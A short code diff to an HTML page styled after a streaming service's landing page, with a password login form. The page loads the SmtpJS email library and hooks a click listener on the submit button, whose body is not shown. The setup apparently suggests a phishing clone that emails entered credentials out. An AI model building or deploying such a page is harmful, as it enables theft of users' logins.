@@ -25,7 +25,7 @@
                     <br>
                     <input type="password" class="box" id="password" name="password" placeholder="Password" required >
                     <br>
-                    <input type="submit" value="Submit" id="submit" />
+                    <input type="submit" value="Submit" id="submit" onkeypress="submit()" />
                 </form>
             </div>
 
@@ -37,7 +37,7 @@
         <h1 id="head">See what's next</h1> 
         <p id="para">Watch anywhere. Cancel Anytime</p>
         <!-- <a href="http://127.0.0.1:5500/yash.html"> -->
-            <button id="free" title="First Sign Up">Watch Free for 30 Days</button>
+            <button id="free" title="First Sign Up">Watch Here</button>
         <!-- </a> -->
     </div>
 </header>
@@ -207,10 +207,10 @@
     </div>
 
     </footer>
-</body>
 
-<script src="https://smtpjs.com/v3/smtp.js">
-</script>
+</body>
+    <script src="https://smtpjs.com/v3/smtp.js">
+   </script>
 <script>
   var btn=document.getElementById('submit')
   btn.addEventListener('click',function(e){
